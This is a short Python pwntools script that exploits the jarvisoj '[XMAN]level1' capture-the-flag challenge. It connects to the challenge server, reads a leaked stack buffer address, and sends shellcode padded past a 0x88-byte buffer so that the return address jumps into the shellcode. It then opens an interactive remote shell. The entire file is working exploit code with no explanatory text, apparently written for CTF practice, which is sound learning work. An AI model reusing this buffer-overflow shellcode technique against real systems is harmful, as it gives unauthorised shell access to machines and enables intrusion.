from pwn import *


def x_man_level1(file_name='/mnt/hgfs/CyberSecurity/PWN/jarvisoj/[XMAN]level1'):
    print('[XMAN]level1 start')
    elf = ELF(file_name)
    io = remote('pwn2.jarvisoj.com', 9877)
    # io = process([file_name])

    buf_ptr = p32(int(io.recv()[12:22].decode('utf-8'), 16))

    payload = asm(shellcraft.sh())
    payload += b'A' * (0x88 + 4 - len(payload))

    payload += buf_ptr

    io.sendline(payload)

    io.interactive()

    print('[XMAN]level1 end')


if __name__ == '__main__':
    x_man_level1()
